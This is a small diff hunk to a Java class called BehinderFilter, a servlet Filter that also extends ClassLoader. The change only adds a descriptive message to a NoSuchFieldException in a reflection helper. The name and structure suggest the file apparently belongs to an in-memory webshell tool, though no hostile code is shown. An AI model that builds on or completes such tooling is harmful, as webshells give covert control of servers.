@@ -76,7 +76,7 @@ public class BehinderFilter extends ClassLoader implements Filter {
                 clazz = clazz.getSuperclass();
             }
         }
-        throw new NoSuchFieldException();
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
     }
 
     @SuppressWarnings("all")
